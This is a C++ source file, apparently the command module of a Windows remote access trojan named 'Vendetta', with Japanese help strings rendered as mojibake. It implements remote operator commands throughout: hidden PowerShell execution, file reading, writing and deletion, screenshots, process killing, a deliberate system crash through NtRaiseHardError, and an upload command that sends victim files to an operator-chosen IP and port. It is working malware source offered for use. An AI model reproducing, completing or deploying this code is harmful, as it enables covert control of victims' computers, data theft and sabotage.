// RAT�̃R�}���h���`
#include "Vendetta.h"





void Write(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: write <���[�h> <�t�@�C����> <�������ޕ�����>" + newline +
            "����: �w�肵���t�@�C���ɕ�������������݂܂��B���[�h���w�肷�邱�ƂŁA" + newline +
            "�t�@�C���ɕ������ǋL���邩�A�����̓��e���㏑�����邩��I���ł��܂��B" + newline + newline +
            "�p�����[�^:" + newline +
            "  <���[�h> �������݃��[�h���w�肵�܂�:" + newline +
            "           append: �����̓��e�ɒǉ�����`�ŏ������݂܂�" + newline +
            "           overwrite: �t�@�C���̊������e���폜���ď������݂܂�" + newline +
            "  <�t�@�C����> �������ޑΏۂ̃t�@�C�����܂��̓p�X" + newline +
            "  <�������ޕ�����> �t�@�C���ɏ������ޕ�����" + newline + newline +
            "�g�p��:" + newline +
            "  write overwrite myfile.txt HelloWorld" + newline;

        SendString(helpStr);
        return;
    }

    
    if (tokens.size() < 4) {
        SendString("�g�p���@: write <���[�h> <�t�@�C����> <�������ޕ�����>");
        return;
    }

    std::string mode = tokens[1];
    std::string filename = tokens[2];
    std::string text;

    // �����Ɏw�肳�ꂽ�e�L�X�g����������
    for (size_t i = 3; i < tokens.size(); ++i) {
        text += tokens[i] + " ";
    }

    std::ofstream file;

    // �ǋL
    if (mode == "append") {
        file.open(filename, std::ios::app);
    }
    // �㏑��
    else if (mode == "overwrite") {
        file.open(filename, std::ios::trunc);
    }
    else {
        SendString("[-] �����ȃ��[�h�ł�");
        return;
    }

    if (file.is_open()) {
        file << text << std::endl;
        SendString("[+] �t�@�C���ɏ������݂܂���: " + filename);
    }
    else {
        SendString("[-] �t�@�C�����J���܂���ł���");
    }
}


void Cat(std::vector<std::string>& tokens) {
    bool binaryMode = false;

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: cat <�t�@�C����> [-b]" + newline +
            "����: �w�肵���t�@�C���̓��e��\�����܂��B" + newline + newline +
            "�I�v�V����:" + newline +
            "  -b : �o�C�i�����[�h�Ńt�@�C����\�����܂��B���e��16�i���̃o�C�g��ŏo�͂���A" + newline +
            "       �e�o�C�g�̓X�y�[�X�ŋ�؂��܂��B" + newline + newline +
            "�ڍ�:" + newline +
            "  'cat' �R�}���h�́A�e�L�X�g�t�@�C����o�C�i���t�@�C���̓��e��W���o�͂ɕ\�����܂��B" + newline +
            "  �e�L�X�g�t�@�C���̏ꍇ�͊e�s�����s�ŋ�؂��ĕ\�����܂��B�o�C�i�����[�h�ł́A" + newline +
            "  �e�o�C�g��16�i���`���ŕ\������A64�o�C�g���Ƃɉ��s����܂��B" + newline + newline +
            "�g�p��:" + newline +
            "  cat example.txt   - �e�L�X�g���[�h�� 'example.txt' �̓��e��\��" + newline +
            "  cat example.bin -b - �o�C�i�����[�h�� 'example.bin' �̓��e��16�i���\��" + newline;

        SendString(helpStr);
        return;
    }

    // �t�@�C�����̑��݃`�F�b�N
    if (tokens.size() < 2) {
        SendString("�g�p���@: cat <�t�@�C����> [-b]");
        return;
    }

    // �I�v�V�����̏���
    std::string filename = tokens[1];
    if (tokens.size() > 2 && tokens[2] == "-b") {
        binaryMode = true;
    }

    std::ifstream file(filename, binaryMode ? std::ios::binary : std::ios::in);

    // �t�@�C�����J���Ȃ��ꍇ�̃G���[����
    if (!file.is_open()) {
        SendString("�G���[: �t�@�C�� '" + filename + "' ���J���܂���");
        return;
    }

    std::ostringstream fileContents;
    if (binaryMode) {
        // �o�C�i���t�@�C����16�i���ŕ\��
        char byte;
        int byteCount = 0;
        while (file.get(byte)) {
            fileContents << std::hex << std::setw(2) << std::setfill('0') << (static_cast<int>(byte) & 0xff) << " ";
            byteCount++;

            // 16�o�C�g���Ƃɉ��s
            if (byteCount % 64 == 0) {
                fileContents << "\n";
            }
        }
        // �Ō�ɉ��s���Ȃ��ꍇ�͉��s��ǉ�
        if (byteCount % 16 != 0) {
            fileContents << "\n";
        }
    }
    else {
        // �e�L�X�g�t�@�C���̓ǂݍ���
        std::string line;
        while (std::getline(file, line)) {
            fileContents << line << "\n";
        }
    }

    file.close();

    // �t�@�C���̓��e�𑗐M
    SendString(fileContents.str());
}


void RunPowerShellCommand(std::vector<std::string>& tokens) {

    // �w���v�̕\��
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: pwsh <PowerShell�R�}���h>" + newline +
            "����: �w�肵��PowerShell�R�}���h�����s���܂��B";

        SendString(helpStr);
        return;
    }

    if (tokens.size() < 2) {
        SendString("�g�p���@: pwsh <PowerShell�R�}���h>");
        return;
    }

    // PowerShell�R�}���h������
    std::string command;
    for (size_t i = 1; i < tokens.size(); ++i) {
        command += tokens[i] + " ";
    }

    // ���s����PowerShell�R�}���h
    std::string fullCommand = "powershell -Command \"" + command + "\"";

    SendString("[*] ���s����PowerShell�R�}���h: " + fullCommand);

    // CreateProcess�ɕK�v�ȏ�������
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};

    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // �R�}���h�����s
    BOOL result = CreateProcessA(nullptr, (LPSTR)fullCommand.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi );

    if (result) {
        SendString("[+] PowerShell�R�}���h�𐳏�Ɏ��s���܂���");
        // �v���Z�X���I������܂őҋ@
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        SendString("[-] PowerShell�R�}���h�̎��s�Ɏ��s���܂���");
    }
}




void Pwd(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: pwd" + newline +
            "����: ���݂̍�ƃf�B���N�g���̃p�X��\�����܂�";

        SendString(helpStr);
        return;
    }

    char currentDir[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
        SendString(std::string(currentDir));
    }
    else {
        SendString("[-] �J�����g�f�B���N�g���̎擾�Ɏ��s");
    }
}


void ProcessList(std::vector<std::string>& tokens) {
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // �v���Z�X�̃X�i�b�v�V���b�g���擾
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        SendString("[-] �X�i�b�v�V���b�g�̍쐬�Ɏ��s���܂���");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hProcessSnap, &pe32)) {
        SendString("[-] �v���Z�X���̎擾�Ɏ��s���܂���");
        return;
    }

    // �񕝂̒�`
    const int pidWidth = 8;
    const int nameWidth = 40;
    const int archWidth = 15;
    const int threadsWidth = 12;
    const int priorityWidth = 10;
    const int memoryWidth = 15;

    // UTF-8�ŃG���R�[�h���ꂽ�w�b�_�[������
    std::ostringstream processList;
    processList << std::left
        << std::setw(pidWidth) << "PID"
        << std::setw(nameWidth) << "�v���Z�X��"
        << std::setw(archWidth) << "�A�[�L�e�N�`��"
        << std::setw(threadsWidth) << "�X���b�h��"
        << std::setw(priorityWidth) << "�D��x"
        << std::setw(memoryWidth) << "������(MB)"
        << "\n"
        << std::string(100, '-') << "\n";

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE ,pe32.th32ProcessID);

        std::string architecture = "�s��";
        BOOL isWow64 = FALSE;
        if (hProcess != NULL) {
            if (IsWow64Process(hProcess, &isWow64)) {
                architecture = isWow64 ? "x86" : "x64";
            }
        }

        // ���������̎擾
        PROCESS_MEMORY_COUNTERS_EX pmc;
        std::string memoryUsage = "N/A";
        if (hProcess != NULL && GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS*)&pmc, sizeof(pmc))) {
            double memMB = pmc.WorkingSetSize / (1024.0 * 1024.0);
            std::ostringstream memStream;
            memStream << std::fixed << std::setprecision(1) << memMB;
            memoryUsage = memStream.str();
        }

        // �v���Z�X�������C�h��������UTF-8�ɕϊ�
        std::string processName;
        int name_size = WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, nullptr, 0, nullptr, nullptr);
        if (name_size > 0) {
            std::vector<char> buffer(name_size);
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, buffer.data(), name_size, nullptr, nullptr);
            processName = buffer.data();
        }

        // �v���Z�X���̏o��
        processList << std::left
            << std::setw(pidWidth) << pe32.th32ProcessID
            << std::setw(nameWidth) << processName
            << std::setw(archWidth) << architecture
            << std::setw(threadsWidth) << pe32.cntThreads
            << std::setw(priorityWidth) << pe32.pcPriClassBase
            << std::setw(memoryWidth) << memoryUsage
            << "\n";

        if (hProcess != NULL) {
            CloseHandle(hProcess);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    SendString(processList.str());
    CloseHandle(hProcessSnap);
}

void Touch(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: touch <�t�@�C����>");
        return;
    }

    std::string filename = tokens[1];
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        SendString("[+] �t�@�C���쐬: " + filename);
    }
    else {
        SendString("[-] �t�@�C���̍쐬�Ɏ��s");
    }
}



void Copy(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("�g�p���@: cp <�\�[�X> <����>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    std::ifstream src(source, std::ios::binary);
    std::ofstream dst(destination, std::ios::binary);

    if (src && dst) {
        dst << src.rdbuf();
        SendString("[+] " + source + " ���� " + destination + " �փR�s�[���܂���: ");
    }
    else {
        SendString("[-] �t�@�C�����R�s�[�ł��܂���ł���");
    }
}

// mv�R�}���h (�t�@�C����f�B���N�g���̈ړ�)
void Move(std::vector<std::string>& tokens) {
    if (tokens.size() < 3) {
        SendString("�g�p���@: mv <�\�[�X> <����>");
        return;
    }

    std::string source = tokens[1];
    std::string destination = tokens[2];

    if (MoveFileA(source.c_str(), destination.c_str())) {
        SendString("[+] " + source + " ���� " + destination + " �ֈړ����܂���");
    }
    else {
        SendString("[-] �t�@�C�����ړ��ł��܂���ł���");
    }
}


void Remove(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: rm <�t�@�C����>");
        return;
    }

    std::string filename = tokens[1];
    if (DeleteFileA(filename.c_str())) {
        SendString("[+] �t�@�C���폜: " + filename);
    }
    else {
        SendString("[-] �t�@�C���̍폜�Ɏ��s");
    }
}

void Dir(std::vector<std::string>& tokens) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("*", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    std::ostringstream fileList;
    fileList << std::left << std::setw(20) << "���t/����" << std::setw(12) << "�T�C�Y" << "���O" << "\n";

    do {
        // �t�@�C����f�B���N�g���̑������擾
        bool isDir = (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        // �X�V�������擾
        FILETIME ft = findFileData.ftLastWriteTime;
        SYSTEMTIME st;
        FileTimeToSystemTime(&ft, &st);

        // �T�C�Y���擾
        std::string sizeStr;
        if (isDir) {
            sizeStr = " ";
        }
        else {
            sizeStr = std::to_string(findFileData.nFileSizeLow);
            if (findFileData.nFileSizeLow >= 1024) {
                sizeStr = std::to_string(findFileData.nFileSizeLow / 1024) + " KB";
            }
            else {
                sizeStr += " b";
            }
        }

        // �����̃t�H�[�}�b�g
        char dateTimeStr[20];
        sprintf_s(dateTimeStr, sizeof(dateTimeStr), "%04d/%02d/%02d %02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        // �t�@�C�����X�g�ɒǉ�
        fileList << std::left << std::setw(20) << dateTimeStr
            << std::setw(12) 
            << sizeStr
            << (isDir ? "<DIR>" : "   ") 
            << " " 
            << findFileData.cFileName 
            << "\n";

    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
    SendString(fileList.str());
}

void Cd(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: cd <�f�B���N�g��>");
        return;
    }

    std::string directory = tokens[1];

    // �f�B���N�g����ύX
    if (SetCurrentDirectoryA(directory.c_str())) {
        SendString("[+] �f�B���N�g����ύX���܂���: " + directory);
    }
    else {
        SendString("[-] �f�B���N�g���̕ύX�Ɏ��s���܂���");
    }
}







void MkDir(std::vector<std::string>& tokens) {
    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: mkdir <�t�H���_��>" + newline +
            "����: �V�����t�H���_���쐬���܂�";
        SendString(helpStr);
        return;
    }

    // �K�v�Ȉ������w�肳��Ă��Ȃ��ꍇ
    if (tokens.size() < 2) {
        SendString("�g�p���@: mkdir <�t�H���_��>");
        return;
    }

    std::string dirName = tokens[1];
    if (CreateDirectoryA(dirName.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        SendString("[+] �t�H���_���쐬���܂���: " + dirName);
    }
    else {
        SendString("[-] �t�H���_�̍쐬�Ɏ��s���܂���");
    }
}


void Rmdir(std::vector<std::string>& tokens) {

    // �w���v
    if (tokens.size() > 1 && helpOptions.count(tokens[1]) > 0) {
        std::string helpStr =
            "�g�p���@: rmdir" + newline +
            "����: �t�H���_���폜���܂�";

        SendString(helpStr);
        return;
    }

    // �����`�F�b�N
    if (tokens.size() < 2) {
        SendString("�g�p���@: rmdir <�폜����t�H���_��>");
        return;
    }

    std::string dirName = tokens[1];

    // �t�H���_�폜
    if (RemoveDirectoryA(dirName.c_str())) {
        SendString("[+] �t�H���_���폜���܂���: " + dirName);
    }
    else {
        SendString("[-] �t�H���_�̍폜�Ɏ��s���܂���");
    }
}








// NtRaiseHardError�𒼐ڌĂяo���ăV�X�e���N���b�V��
void SystemCrash(std::vector<std::string>& tokens) {

    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, true, false, nullptr);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, nullptr);
}

// ���b�Z�[�W�{�b�N�X��\��
void ShowMessageBox(std::vector<std::string>& tokens) {
    // �f�t�H���g�̃��b�Z�[�W�ƃ^�C�g��
    std::string defaultMessage = "By Vendetta";
    std::string defaultTitle = "Hello";

    if (tokens.size() > 1) {
        defaultTitle = tokens[2];
    }
    if (tokens.size() > 2) {
        defaultMessage = tokens[1];
    }

    std::thread([defaultMessage, defaultTitle]() {
        MessageBoxA(0, defaultMessage.c_str(), defaultTitle.c_str(), MB_OK);

        }).detach();

    SendString("[+] ���b�Z�[�W�{�b�N�X��\�����܂���");
}




void ScreenShot(std::vector<std::string>& tokens) {

    std::string filename = "screenshot.bmp";
    if (tokens.size() > 1) {
        filename = tokens[1];
    }

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // �r�b�g�}�b�v�f�[�^���t�@�C���ɏ�������
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = height;
    bi.biPlanes = 1;
    bi.biBitCount = 24; // RGB
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // �t�@�C���쐬
    FILE* file;
    fopen_s(&file, filename.c_str(), "wb");
    if (file == NULL) {
        SendString("[-] �X�N���[���V���b�g�t�@�C���̍쐬�Ɏ��s���܂���");
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return;
    }

    // �w�b�_�[����������
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = bmfHeader.bfOffBits + width * height * 3;
    bmfHeader.bfReserved1 = 0;
    bmfHeader.bfReserved2 = 0;

    fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
    fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

    BYTE* pPixels = new BYTE[width * height * 3];
    GetDIBits(hMemoryDC, hBitmap, 0, height, pPixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    fwrite(pPixels, width * height * 3, 1, file);

    delete[] pPixels;
    fclose(file);

    // ���\�[�X���
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    SendString("[+] �X�N���[���V���b�g�� " + filename + " �ɕۑ����܂���");
}


void UploadFile(std::vector<std::string>& tokens) {
    if (tokens.size() < 4) {
        SendString("�g�p���@: uploadfile <�t�@�C����> <Upload�T�[�o�[��IP�A�h���X> <Upload�T�[�o�[�̃|�[�g�ԍ�>");
        return;
    }

    std::string filename = tokens[1];
    std::string ipAddress = tokens[2];
    int port = std::stoi(tokens[3]);

    // �t�@�C�����J��
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        SendString("[-] �t�@�C�����J�����Ƃ��ł��܂���ł���");
        return;
    }

    // �T�[�o�[�̃A�h���X����ݒ�
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &serverAddr.sin_addr);

    // �\�P�b�g�쐬
    SOCKET uploadSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (uploadSocket == INVALID_SOCKET) {
        SendString("[-] �\�P�b�g�̍쐬�Ɏ��s���܂���");
        return;
    }

    // �T�[�o�[�ɐڑ�
    if (connect(uploadSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        SendString("[-] �T�[�o�[�ɐڑ��ł��܂���ł���");
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C���n���h�����쐬
    HANDLE fileHandle = CreateFileA(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

    if (fileHandle == INVALID_HANDLE_VALUE) {
        SendString("[-] �t�@�C���n���h�����J�����Ƃ��ł��܂���ł���");
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C���T�C�Y�擾
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        SendString("[-] �t�@�C���T�C�Y�̎擾�Ɏ��s���܂���");
        CloseHandle(fileHandle);
        closesocket(uploadSocket);
        return;
    }

    // �t�@�C�����M
    SendString("�t�@�C�����M��: " + filename + " (�T�C�Y: " + std::to_string(fileSize.QuadPart) + " �o�C�g)");

    BOOL result = TransmitFile(uploadSocket, fileHandle, 0, 0, nullptr, nullptr, 0);

    if (!result) {
        SendString("[-] �t�@�C�����M�Ɏ��s���܂���");
    }
    else {
        SendString("[+] �t�@�C���̃A�b�v���[�h���������܂���");
    }

    CloseHandle(fileHandle);
    closesocket(uploadSocket);
}


void Netstat(std::vector<std::string>& tokens) {
    if (tokens.size() != 1 || tokens[0] != "netstat") {
        SendString("�g�p���@: netstat");
        return;
    }
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    if (GetExtendedTcpTable(nullptr, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == ERROR_INSUFFICIENT_BUFFER) {
        auto tcpTable = (PMIB_TCPTABLE)malloc(dwSize);
        if (tcpTable == nullptr) {
            SendString("[-] ���������蓖�ĂɎ��s���܂���");
            return;
        }

        dwRetVal = GetExtendedTcpTable(tcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
        if (dwRetVal != NO_ERROR) {
            SendString("[-] TCP�e�[�u���̎擾�Ɏ��s���܂���");
            free(tcpTable);
            return;
        }

        std::ostringstream result;
        result << "�A�N�e�B�u�Ȑڑ�\n\n";

        // �񕝂̒�`
        const int protocolWidth = 15;
        const int addressWidth = 35;
        const int stateWidth = 20;

        // �w�b�_�[�̏o��
        result << std::left
            << std::setw(protocolWidth) << "�v���g�R��"
            << std::setw(addressWidth) << "���[�J�� �A�h���X"
            << std::setw(addressWidth) << "�O���A�h���X"
            << "���\n";

        for (unsigned int i = 0; i < tcpTable->dwNumEntries; i++) {
            struct in_addr localIp, remoteIp;
            localIp.S_un.S_addr = tcpTable->table[i].dwLocalAddr;
            remoteIp.S_un.S_addr = tcpTable->table[i].dwRemoteAddr;
            unsigned short localPort = ntohs((unsigned short)(tcpTable->table[i].dwLocalPort));
            unsigned short remotePort = ntohs((unsigned short)(tcpTable->table[i].dwRemotePort));

            // ��Ԃ̐ݒ�
            const char* state;
            switch (tcpTable->table[i].dwState) {
            case MIB_TCP_STATE_ESTAB: state = "ESTABLISHED"; break;
            case MIB_TCP_STATE_LISTEN: state = "LISTENING"; break;
            case MIB_TCP_STATE_CLOSE_WAIT: state = "CLOSE_WAIT"; break;
            case MIB_TCP_STATE_LAST_ACK: state = "LAST_ACK"; break;
            default: state = "UNKNOWN"; break;
            }

            // IP�A�h���X�ƃ|�[�g������
            std::ostringstream localAddr, remoteAddr;
            localAddr << inet_ntoa(localIp) << ":" << localPort;
            remoteAddr << inet_ntoa(remoteIp) << ":" << remotePort;

            // ���`���ꂽ�s���o��
            result << std::left
                << std::setw(protocolWidth) << "TCP"
                << std::setw(addressWidth) << localAddr.str()
                << std::setw(addressWidth) << remoteAddr.str()
                << state << "\n";
        }

        SendString(result.str().empty() ? "�A�N�e�B�u��TCP�ڑ��͂���܂���" : result.str());
        free(tcpTable);
    }
    else {
        SendString("[-] TCP�e�[�u���̃T�C�Y���擾�ł��܂���ł���");
    }
}


void CreateNewProcess(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: createprocess <���s�\�t�@�C���̃p�X>");
        return;
    }

    std::string executablePath = tokens[1];
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};

    // �v���Z�X���쐬
    if (!CreateProcessA(executablePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
        SendString("[-] �v���Z�X�̍쐬�Ɏ��s���܂���");
        return;
    }

    SendString("[+] �v���Z�X������ɍ쐬����܂����BPID: " + std::to_string(pi.dwProcessId));

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void TerminateProcess(std::vector<std::string>& tokens) {
    if (tokens.size() < 2) {
        SendString("�g�p���@: killprocess <�v���Z�XID>");
        return;
    }

    int pid = std::stoi(tokens[1]);

    // �v���Z�X�n���h�����J��
    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (processHandle == nullptr) {
        SendString("[-] �v���Z�X�̃I�[�v���Ɏ��s���܂���");
        return;
    }

    // �v���Z�X���I��
    if (!TerminateProcess(processHandle, 0)) {
        SendString("[-] �v���Z�X�̏I���Ɏ��s���܂���");
    }
    else {
        SendString("[+] �v���Z�X������ɏI�����܂����B");
    }

    CloseHandle(processHandle);
}
